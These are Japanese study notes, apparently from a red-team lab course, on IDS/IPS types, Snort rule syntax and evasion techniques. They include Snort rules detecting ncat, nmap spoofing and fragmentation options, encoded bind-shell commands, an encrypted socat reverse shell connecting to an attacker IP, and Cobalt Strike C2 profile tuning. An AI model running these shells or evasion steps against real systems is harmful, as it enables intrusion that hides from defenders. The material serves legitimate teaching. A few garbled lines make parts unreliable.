## Intro
- 侵入検知システム（IDS）は、ネットワークやシステムへの侵入を検知するシステムである。ひとつの例えとして、警備員がさまざまなセキュリティ・カメラのライブ・フィードを監視している様子を思い浮かべることができる。彼は盗難を発見することはできるが、自分一人でそれを止めることはできない。しかし、この警備員が他の警備員に連絡し、強盗を止めるよう依頼することができれば、検知は予防に変わる。侵入検知防御システム（IDPS）または単に侵入防御システム（IPS）は、侵入を検知し、防止することができるシステムである。  
  
- 検知と予防の違いを理解することが重要です。Snortはネットワーク侵入検知および侵入検知システムです。そのため、SnortはIDSまたはIPSとして設定できます。SnortがIPSとして機能するには、違反接続をブロック（ドロップ）するメカニズムが必要です。この機能を使用するには、Snortをインラインに設定し、2つ以上のネットワーク カードをブリッジする必要があります。

- IDSのセットアップは、ネットワーク内の位置に基づいて、次のように分けることができる：  
  
1. ホストベースIDS (HIDS)  
2. ネットワークベースIDS (NIDS)  
- ホストベースのIDS（HIDS）は、他の実行中のアプリケーションとともにOSにインストールされる。このセットアップにより、HIDSはホストに出入りするトラフィックを監視できるようになり、さらにホスト上で実行されているプロセスを監視できるようになる。  
  
- ネットワークベースの IDS（NIDS）は、ネットワークトラフィックを監視するための専用アプライアンスまたはサーバーである。NIDSは、保護したいネットワークまたはVLANのすべてのネットワーク・トラフィックを監視できるように接続する必要がある。これはNIDSをスイッチのモニターポートに接続することで実現できる。NIDSはネットワーク・トラフィックを処理して悪意のあるトラフィックを検出する。

## IDS Engine Types

- ネットワーク・トラフィックは次のように分類できる：  
  
1. 良性のトラフィック：通常のトラフィックで、IDSに警告されることはない。  
2. 悪意のあるトラフィック：正常なトラフィックであり、IDSに検知されることを望んでいない。

- ネットワーク・トラフィックを分類できるのと同じように、ホストのアクティビティも分類できる。IDSの検知エンジンは、悪意のあるトラフィックやアクティビティを検知することを中心に構築されるか、正常なトラフィックやアクティビティを認識することを中心に構築される。正常」を認識することで、正常からの逸脱を簡単に検出することができます。  
  
- その結果、IDS の検出エンジンは次のようになります：
1. シグネチャ・ベース：シグネチャ・ベースの IDS は、悪意のある（または不要な）トラフィックに関する完全な知識を必要とする。言い換えれば、シグネチャ・ベースの検知エンジンに悪意のあるトラフィックの特徴を明示的に与える必要がある。悪意のあるトラフィックについて IDS に教えるには、照合するための明示的なルールを使用します。  
2. アノマリー・ベース：この場合、IDS は通常のトラフィックがどのように見えるかについての知識を持つ必要がある。言い換えれば、IDS が正常でないものを認識できるように、正常とは何かを IDS に「教える」必要がある。IDSに通常のトラフィック、つまりベースラインのトラフィックを教えるには、機械学習または手動のルールを使用します。

- 別の言い方をすれば、シグネチャ・ベースのIDSは悪意のあるトラフィックを認識するので、悪意のないものはすべて良性（正常）とみなされる。このアプローチはアンチウィルス・ソフトウェアによく見られ、既知のウィルス・シグネチャのデータベースを持っている。シグネチャに一致するものはすべてウイルスとして検出される。  
  
- アノマリー・ベースのIDSは正常なトラフィックを認識するため、正常から逸脱したものは悪意があるとみなされる。このアプローチは、人間が物事を認識する方法に似ている。ウェブ・ブラウザを起動するとき、スピード、パフォーマンス、応答性に対して一定の期待を持っている。言い換えれば、あなたは自分のブラウザの「正常」を知っている。突然、ウェブブラウザの動作が重くなったり、反応が悪くなったりしたら、何かがおかしいと気づくでしょう。言い換えれば、ブラウザのパフォーマンスが通常から逸脱した時点で、あなたはそれを知ったのです。

##  IDS/IPS Rule Triggering

- 各IDS/IPSには、ルールを記述するための一定の構文がある。例えば、Snortはルールに次のような書式を使用する：`Rule Header (Rule Options)`、ルールヘッダの構成：

1. Action: Examples of action include `alert`, `log`, `pass`, `drop`, and `reject`.
2. Protocol: `TCP`, `UDP`, `ICMP`, or `IP`.
3. Source IP/Source Port: `!10.10.0.0/16 any` クラスBサブネットにないものすべてを指す `10.10.0.0/16`.
4. Direction of Flow: `->`  左から (source) 右を表し (destination),  `<>` 双方向を表す
5. Destination IP/Destination Port: `10.10.0.0/16 any` クラスBサブネットを指す `10.10.0.0/16`.

- 以下は、Snort IPSを通過するすべてのICMPトラフィックを`drop`するルールの例です：
- `drop icmp any any -> any any (msg: "ICMP Ping Scan"; dsize:0; sid:1000020; rev: 1;)`

- 上記のルールは、Snort IPSに、任意のソースIPアドレス（任意のポート）から任意の宛先IPアド レス（任意のポート）へのICMPタイプのパケットをドロップするように指示します。ログに追加されるメッセージは「ICMP Ping Scan」です。

- ウェブ・サーバーに脆弱性が発見された場合を考えてみよう。この脆弱性は、ウェブ・サーバーがHTTP POSTメソッドのリクエストを処理する方法にあり、攻撃者がシステム・コマンドを実行できるようにします。  
  
- 次のような「素朴な」アプローチを考えてみましょう。この脆弱性を悪用する方法を知るために、Webサーバーとやり取りされるトラフィックのペイロードで`ncat`という用語を検出するSnortルールを作成したいとします。
- `alert tcp any any <> any 80 (msg: "Netcat Exploitation"; content:"ncat"; sid: 1000030; rev:1;)`
- 上記のルールは、ポート80で交換されるパケットの内容を`ncat`という文字列で検査します。ASCIIの`ncat`は16進数で`6e 63 61 74`と記述され、2つのパイプ文字｜で文字列としてカプセル化されます。
- `alert tcp any any <> any 80 (msg: "Netcat Exploitation"; content:"|6e 63 61 74|"; sid: 1000031; rev:1;)`
- HTTP POSTリクエストで確認されることが予想される場合は、さらに絞り込 むことができる。`flow:established`は、TCP 3-wayハンドシェイク（確立された接続）で開始されたストリームを検 索するようにSnortエンジンに指示することに注意。
- `alert tcp any any <> any 80 (msg: "Netcat Exploitation"; flow:established,to_server; content:"POST"; nocase; http_method; content:"ncat"; nocase; sid:1000032; rev:1;)`

- ASCIIロギングが選択された場合、ログは次に示す2つの警告のようになる。
![[Pasted image 20230623181926.png | 400]]
- シグネチャベースのIDSとそのルールには、いくつかポイントがある。攻撃者がペイロードにncatをそのまま使用しないように少しでも変更すれば、攻撃は気づかれないだろう。結論として、シグネチャベースのIDSやIPSは、そのシグネチャ（ルール）がどれだけよく書かれ、更新されているかに制限される。次の課題では、いくつかの回避テクニックを紹介する。

## Evasion via Protocol Manipulation

- シグネチャ・ベースの IDS/IPS を回避するには、IDS/IPS のシグネチャに一致しないよう にトラフィックを操作する必要がある。以下は、IDS/IPS システムを回避するために考えられる 4 つの一般的なアプローチである。

1. Evasion via Protocol Manipulation
2. Evasion via Payload Manipulation
3. Evasion via Route Manipulation
4. Evasion via Tactical Denial of Service (DoS)

![[Pasted image 20230623182138.png | 400]]
- この部屋では、`nmap`と`ncat`/`socat`を使った回避に焦点を当てる。Nmapに関連する回避技術については、[2. Firewalls(範囲外)](2.%20Firewalls(範囲外).md)の部屋で詳しく説明している。この部屋では、適切な場合には`ncat`と`socat`を強調する。  
  
- それぞれのアプローチについて、それぞれのタスクで展開していく。最初のものから始めよう。プロトコル操作による回避には以下のようなものがある：
- Relying on a different protocol
- Manipulating (Source) TCP/UDP port
- Using session splicing (IP packet fragmentation)
- Sending invalid packets

### Rely on a Different Protocol
- IDS/IPSシステムは、特定のプロトコルをブロックし、他のプロトコルを許可するように設定されているかもしれない。例えば、TCP の代わりに UDP を使用したり、DNS の代わりに HTTP を使用して攻撃やデータの流出を行ったりすることが考えられます。攻撃の設計には、ターゲットやターゲット組織に必要なアプリケーションについて収集した知識を利用できます。例えば、ウェブ閲覧が許可されている場合、ローカルプロキシが使用されていない限り、保護されたホストは通常ポート 80 と 443 に接続できることを意味します。あるケースでは、クライアントがGoogleのサービスに依存していたため、攻撃者は悪意のあるサイトを隠すためにGoogleのウェブホスティングを利用した。残念なことに、これは万能ではない。さらに、ノイズを作り過ぎない限り、多少の試行錯誤は必要かもしれない。  
  
- 下図では、DNSクエリーとHTTPリクエストをブロックするようにIPSを設定している。特に、ローカルマシンは外部のDNSサーバーに問い合わせることはできないが、代わりにローカルのDNSサーバーに問い合わせるべきであるというポリシーを実行している。HTTPSに関しては比較的寛容である。この場合、HTTPSを使用してトラフィックをトンネリングすることは、IPSを回避する有望なアプローチに見える。
![[Pasted image 20230623182417.png]]
- [Ncat](https://nmap.org/ncat)を使っている場合を考えてみよう。NcatはデフォルトではTCPコネクションを使うが、`-u`オプションを使えばUDPコネクションを使うようにできる。
- TCPを使ってリッスンするには、`ncat -lvnp PORT_NUM`（ポート番号はリッスンしたいポート番号）を実行するだけでよい。
- TCPポートでリッスンしているNcatインスタンスに接続するには、`ncat TARGET_IP PORT_NUM`
- すでに述べたように、-uを使うとすべての通信がUDPに移行する。
- UDPを使ってリッスンするには、ncat -ulvnp PORT_NUM（ポート番号はリッスンしたいポート番号）を発行すればよい。uを付けない限り、ncatはデフォルトでTCPを使用する。  
- UDPポートでリッスンしているNcatインスタンスに接続するには、nc -u TARGET_IP PORT_NUMを発行すればよい。
- 攻撃者システムでncat -lvnp 25を実行して接続すると、IDS/IPSがディープ・パケット・インスペクション（DPI）を提供していない限り、SMTPサーバーとの通常のTCP接続であるかのように錯覚させる。  
- 攻撃者マシンでncat -ulvnp 162を実行して接続すると、IDS/IPSがDPIをサポートしていない限り、SNMPサーバーとの通常のUDP通信であるかのように錯覚する。

### Manipulate (Source) TCP/UDP Port
- 一般的に言って、TCPとUDPのソース・ポートと宛先ポートは、最も基本的なセキュリティ・ソリューションでも検査される。ディープ・パケット・インスペクションがなければ、ポート番号が使用されるサービスの主な指標となる。言い換えれば、セキュリティ・ソリューションがTCPセグメントによって運ばれるデータを分析できない限り、TCPポート22を含むネットワーク・トラフィックはSSHトラフィックと解釈されるだろう。  
  
- 対象のセキュリティ・ソリューションによっては、ポート・スキャン・トラフィックをウェブ・ブラウジングや DNS クエリに似せることができます。Nmap を使用している場合、-g PORT_NUMBER（または --source-port PORT_NUMBER）オプションを追加して、Nmap に特定のソース・ポート番号からすべてのトラフィックを送信させることができます。
- ターゲットをスキャンしている間、nmap -sS -Pn -g 80 -F MACHINE_IPを使って、一見HTTPサーバーとポートスキャン・トラフィックがやり取りされているように見せる。  
  
- UDPポートのスキャンに興味がある場合は、nmap -sU -Pn -g 53 -F MACHINE_IPを使用して、トラフィックがDNSサーバーとやり取りされているように見せることができる。
- ![[Pasted image 20230623182732.png]]
- Ncatを使っている場合を考えてみよう。DNSトラフィックであるかのようにカモフラージュすることができる。  
  
- 攻撃側のマシンで、Ncatを使ってDNSサーバーのようにUDPポート53をリッスンしたい場合は、ncat -ulvnp 53を使えばよい。  
- ターゲットでは、ncat -u ATTACKER_IP 53を使って、リッスンしているサーバーに接続させることができる。  
- あるいは、クライアントがHTTPサーバーと通信するウェブ・トラフィックのように見せることもできる。  
  
- 攻撃者マシン上で、Ncatに良性のウェブサーバーのようにTCPポート80をリッスンさせるには、ncat -lvnp 80を使う。  
- ターゲット上で、nc ATTACKER_IP 80を使ってリッスン中のサーバーに接続する。

### Use Session Splicing (IP Packet Fragmentation)
IPv4で可能なもう1つのアプローチは、IPパケットの断片化、すなわちセッションスプライシングである。攻撃に関連するパケットをより小さなパケットに分割すれば、IDSシグネチャとのマッチングを避けることができるという前提がある。IDSが悪意のあるペイロードを検出するために特定のバイトストリームを探している場合、ペイロードを複数のパケットに分割します。IDSがパケットを再構築しない限り、ルールはトリガーされません。  
  
Nmapには、パケットを断片化するためのオプションがいくつか用意されている。追加することができる：  
  
-fは、IPパケットのデータを8バイトに設定する。  
-ff：IPパケット内のデータを最大16バイトに制限する。  
--mtu SIZEは、IPパケット内のデータのサイズを指定します。サイズは8の倍数でなければならない。  
すべてのパケットを強制的に特定のサイズに断片化したいとする。その場合、Fragrouteのようなプログラムの使用を検討すべき である。fragrouteは、与えられた設定ファイルからルールセットを読み込 み、それを受信パケットに適用するように設定できる。単純なIPパケットの断片化であれば、ip_frag SIZEを持つ設定ファイルを使用して、指定されたサイズに従ってIPデータを断片化すれば十分である。サイズは8の倍数でなければならない。  
  
例えば、IPデータの断片が16バイトを超えないパケットを断片化するために、ip_frag 16という1行を持つ設定ファイルflagoute.confを作成することができる。そして、fragroute -f fragroute.conf HOSTというコマンドを実行します。ホストは、フラグメントされたパケットを送る宛先である。
### Sending Invalid Packets
一般的に言って、有効なパケットに対するシステムの反応は予測可能な傾向がある。しかし、無効なパケットに対してシステムがどのように反応するかは不明確な場合がある。例えば、IDS/IPSは無効なパケットを処理するかもしれないが、ターゲットシステムはそれを無視するかもしれない。正確な動作については、実験や内部知識が必要である。  
  
Nmapでは、さまざまな方法で無効なパケットを作成することができる。特に、2つの一般的なオプションは、以下のようなパケットを使用してターゲットをスキャンすることである：  
  
無効なTCP/UDPチェックサム  
無効なTCPフラグ  
Nmapでは、-badsumオプションを使用して、間違ったTCP/UDPチェックサムを持つパケットを送信することができる。不正なチェックサムは、元のパケットが送信プログラムからの経路のどこかで変更されたことを示している。  
  
Nmapでは、無効なものも含めて、カスタムTCPフラグを付けてパケットを送信することもできる。scanflagsオプションで、設定したいフラグを選択できる。  
  
URGは緊急  
ACKはAcknowledge  
PSH（プッシュ  
RST はリセット  
SYN（同期  
FIN（終了  
例えば、Synchronize、Reset、Finishのフラグを同時に設定したい場合は、-scanflags SYNRSTFINを使うことができる。  
  
有効か無効かにかかわらず、カスタムフィールドでパケットを作成したい場合は、hping3のようなツールを検討するとよいでしょう。hping3を使用したパケット作成のアイデアを提供するために、いくつかのオプション例を挙げます。  
  
-tまたは-ttlは、IPヘッダーのTime to Liveを設定します。  
-bまたは-badsumは、不正なUDP/TCPチェックサムでパケットを送信します。  
-S、-A、-P、-U、-F、-Rは、それぞれTCP SYN、ACK、PUSH、URG、FIN、RSTフラグを設定する。  
他にも無数のオプションがある。あなたのニーズに応じて、hping3のマニュアルページで完全なリストをチェックするとよいでしょう。

通信チャネルの暗号化  
シェルコードの変更

### Obfuscate and Encode the Payload
IDSのルールは非常に特殊であるため、検知を避けるためにちょっとした変更を加えることができる。その変更には、余分なバイトの追加、攻撃データの難読化、通信の暗号化などがある。  
  
ncat -lvnp 1234 -e /bin/bashというコマンドを考えてみよう。ncatはTCPポート1234をリッスンし、着信接続をBashシェルに接続する。Base64、URLエンコーディング、Unicodeエスケープシーケンスなど、IDS/IPSシグネチャのトリガーを避けるためにコマンドに適用できる一般的な変換がいくつかある。
#### Encode to Base64 format
入力をBase64にエンコードする多くのオンライン・ツールのうちの1つを使うことができる。あるいは、Linuxシステムによくあるbase64を使うこともできる。
![[Pasted image 20230623183203.png]]
ncat -lvnp 1234 -e /bin/bashは`bmNhdCAtbHZucCAxMjM0IC1lIC9iaW4vYmFzaA==`にエンコードされています。
#### URL Encoding
URLエンコーディングでは、特定の文字を%HHという形式に変換します。HHは16進数のASCII表現です。英字、ピリオド、ダッシュ、アンダースコアは影響を受けません。詳しくはRFC 3986の2.4節を参照してください。  
  
Linuxシステムに簡単にインストールできるユーティリティの1つにurlencodeがある。代わりに、オンラインサービスを使うか、MS WindowsやmacOSで同様のユーティリティを検索することもできる。AttackBoxに従うには、apt install gridsite-clientsコマンドを実行してurlencodeをインストールできる。
![[Pasted image 20230623183243.png]]
ncat -lvnp 1234 -e /bin/bashは、URLエンコード後、ncat%20-lvnp%201234%20-e%20%2Fbin%2Fbashになる。IDS/IPSシグネチャが何にマッチするかにもよるが、URLエンコーディングは検知を回避するのに役立つかもしれない。

### Encrypt the Communication Channel
IDS/IPSは暗号化されたデータを検査しないため、攻撃者は暗号化を利用して検知を逃れることができる。エンコードとは異なり、暗号化には暗号化キーが必要です。  
  
1つの直接的なアプローチは、攻撃者のシステム上で必要な暗号化キーを作成し、socatが着信接続をリッスンする際に暗号化キーを使用して暗号化を実施するように設定することである。暗号化されたリバースシェルは3つのステップで実行できる：  
  
鍵を作成する。  
攻撃者のマシンをリッスンする。  
攻撃者のマシンに接続する。  
まず、AttackBoxやLinuxシステムで、opensslを使って鍵を作成する。  
  
openssl req -x509 -newkey rsa:4096 -days 365 -subj '/CN=www.redteam.thm/O=Red Team THM/C=UK' -nodes -keyout thm-reverse.key -out thm-reverse.crt  
  
上記コマンドの引数は以下の通り：  
  
reqは、これが証明書署名リクエストであることを示す。明らかに、我々は署名のために証明書を提出しない。  
-x509は、X.509証明書が欲しいことを指定する。  
-newkey rsa:4096は、新しい証明書要求とRSAを使った新しい秘密鍵を作成する。(RSA鍵のサイズには、-newkey rsa:2048など、他のオプションも使用できる)。  
-days 365は、証明書の有効期間が1年間であることを示す。  
-subjは、組織や国などのデータをコマンドラインで設定する。  
-nodesはコマンドを簡略化し、秘密鍵を暗号化しない。  
-keyout PRIVATE_KEYは、秘密鍵を保存するファイル名を指定する。  
-out CERTIFICATEは、証明書要求を書き込むファイル名を指定する。  
上記のコマンドはこう返す：  
  
秘密鍵： thm-reverse.key  
証明書：thm-reverse.crt  
Privacy Enhanced Mail (PEM) .pemファイルには、秘密鍵.keyと証明書.crtファイルの連結が必要です。catを使って、今作成した2つのファイルからPEMファイルを作成することができます：  
  
cat thm-reverse.key thm-reverse.crt > thm-reverse.pem。  
  
次に、PEMファイルの準備ができたので、クライアントとの通信を暗号化するための鍵を使いながら、リスニングを開始することができる。  
  
socat -d -d OPENSSL-LISTEN:4443,cert=thm-reverse.pem,verify=0,fork STDOUT  
  
socatに慣れていない方のために、今回使用したオプションは以下の通りです：  
  
-デバッグデータ（致命的、エラー、警告、通知メッセージ）を提供する。  
OPENSSL-LISTEN:PORT_NUM は、接続が OPENSSL を使用して暗号化されることを示す。  
cert=PEM_FILEは、暗号化接続を確立するためのPEMファイル（証明書と秘密鍵）を提供します。  
verify=0は相手の証明書のチェックを無効にします。  
forkは、各新規接続を処理するサブプロセスを作成する。  
第三に、被害者システムで socat OPENSSL:10.20.30.1:4443,verify=0 EXEC:/bin/bash を実行する。EXEC は指定されたプログラムを起動することに注意。

### Modify the data
Ncatを使ってバインドシェルを作りたい、という単純なケースを考えてみよう。次のコマンド ncat -lvnp 1234 -e /bin/bash は、TCPポート1234をリッスンし、Bashシェルをバインドするようncatに指示する。このようなコマンドを含むパケットを検出したい場合、シグネチャーにマッチするような具体的なものを考える必要があるが、あまり具体的すぎてもいけない。  
  
ncat -lvnpのスキャンは、フラグの順番を変えることで簡単に回避できる。  
一方、ncat -のペイロードの検査は、ncat -のように余分な空白を追加することで回避できる。  
IDSがncatを探しているのであれば、元のコマンドに単純な変更を加えるだけでは検知を逃れることはできない。ターゲットとなるシステム／アプリケーションに応じて、より洗練されたアプローチを検討する必要がある。一つの選択肢は、ncやsocatのような別のコマンドを使うことだろう。あるいは、ターゲット・システムが適切に処理できるのであれば、別のエンコーディングを検討することもできる。

### Relying on Source Routing
多くの場合、ソース・ルーティングを使って、パケットを宛先に到達させるために特定のルートを使わせることができる。Nmapは--ip-optionsオプションを使用してこの機能を提供する。Nmapはルースルーティングとストリクトルーティングを提供する：  
  
例えば、--ip-options "L 10.10.10.50 10.10.50.250 "と指定すると、スキャンパケットを指定された2つのIPアドレス経由でルーティングするよう要求する。  
ストリクト・ルーティングは、Sを使用して指定できる。ストリクト・ルーティングでは、システムとターゲット・ホスト間のすべてのホップを設定する必要がある。例えば、--ip-options "S 10.10.10.1 10.10.20.2 10.10.30.3 "は、パケットがターゲットホストに到達する前にこれら3つのホップを経由することを指定する。
### Using Proxy Servers
プロキシサーバーを使用すると、ソースを隠すことができる。Nmapには、カンマで区切られたプロキシURLのリストを受け取る --proxies オプションがある。各URLは、proto://host:portの形式で記述する。有効なプロトコルはHTTPとSOCKS4で、認証は現在サポートされていない。  
  
以下の例を考えてみよう。nmap -sS MACHINE_IPを実行する代わりに、Nmapコマンドをnmap -sS HTTP://PROXY_HOST1:8080,SOCKS4://PROXY_HOST2:4153 MACHINE_IPのように編集する。こうすると、スキャンはHTTPプロキシホスト1を経由し、次にSOCKS4プロキシホスト2を経由してターゲットに到達する。信頼できるプロキシを見つけるには、Nmapのスキャンソースを隠すために信頼できるプロキシを見つける前に、いくつかの試行錯誤が必要であることに注意することが重要である。

## C2 and IDS/IPS Evasion
コバルト・ストライク（Cobalt Strike）やエンパイア（Empire）のようなペンテスト・フレームワークは、柔軟なコマンド・アンド・コントロール（C2）プロファイルを提供している。これらのプロファイルは、IDS/IPSシステムを回避するための様々な微調整を可能にする。このようなフレームワークを使用している場合、デフォルトのプロファイルに依存するのではなく、カスタムプロファイルを作成する価値があります。制御できる変数の例としては、以下のようなものがある：
- **User-Agent**:あなたが使っているツールやフレームワークは、デフォルトで設定されているユーザーエージェントを通して、あなたのことを暴露することができる。したがって、ユーザーエージェントを無害なものに設定し、設定を確認するためにテストすることが常に重要です。
- **Sleep Time**:スリープ時間により、ビーコンチェックイン間のコールバック間隔を制御できる。言い換えれば、感染したシステムが制御システムに接続を試みる頻度を制御できる。
- **Jitter**:この変数は、ジッターのパーセンテージで指定されたスリープ時間にランダム性を加えることができる。ジッターを30%にすると、スリープ時間は±30%になり、検知をさらに回避できる。
- **SSL Certificate**:本物そっくりのSSL証明書を使用することで、検知を逃れる可能性が大幅に高まります。これは非常に価値のある時間の投資です。
- **DNS Beacon**: DNSプロトコルを使ってデータを流出させる場合を考えてみよう。DNSクエリーでDNSサーバーとホスト名を設定することで、DNSビーコンを微調整できる。ホスト名は、流出したデータを保持することになる。

- この [CobaltStrike Guideline Profile](https://github.com/bigb0sss/RedTeam-OffensiveSecurity/blob/master/01-CobaltStrike/malleable_C2_profile/CS4.0_guideline.profile)は、プロファイルがどのように作成されるかを示している。

##  Next-Gen Security

[Gartner](https://www.gartner.com/en/documents/2390317-next-generation-ips-technology-disrupts-the-ips-market)によれば、次世代ネットワークIPS（NGNIPS）には以下の5つの特徴がある：
標準的な第一世代のIPS機能：次世代ネットワークIPSは、従来のネットワークIPSが実現できることを実現すべきである。  
アプリケーションの認識とフルスタックの可視性：様々なアプリケーションからのトラフィックを識別し、ネットワーク・セキュリティ・ポリシーを適用する。NGNIPSはアプリケーション層まで把握できなければならない。  
コンテキスト認識：IPS の外部ソースからの情報を使用して、ブロックの判断を支援する。  
コンテンツ認識：インバウンドおよびアウトバウンドのトラフィックに含まれる実行可能プログラムやドキュメントなどのファイルを検査し、分類することができる。  
アジャイル・エンジン: アップグレード・パスをサポートし、新しい情報フィードの恩恵を受けることができます。
次世代ファイアウォール（NGFW）はIPSと同じ機能を提供するため、NGNIPSという言葉はNGFWのために人気を失いつつあるようだ。NGFW については、[2. Firewalls(範囲外)](2.%20Firewalls(範囲外).md)詳しく読むことができる。

## Conclusion

この部屋では、設置場所と検知エンジンに基づくIDSとIPSの種類を取り上げた。また、IDSのルールがどのようにトリガーされるかの例として、Snort 2のルールについても考えました。検知を回避するためには、導入されたデバイスについて可能な限り多くの情報を収集し、さまざまなテクニックを試す必要がある。言い換えれば、セキュリティ・デバイスとその構成に関する完全な知識がない限り、試行錯誤は避けられないかもしれません。  
  
コマンド・アンド・コントロール（C2）フレームワークを使用することで、トラフィックの形状を制御し、できるだけ無害なトラフィックにすることで、IPSの回避に貢献することができる。C2 プロファイルは、任意のプロファイルをサポートする C2 フレームワークを使用する場合に習得すべき重要な機能である。
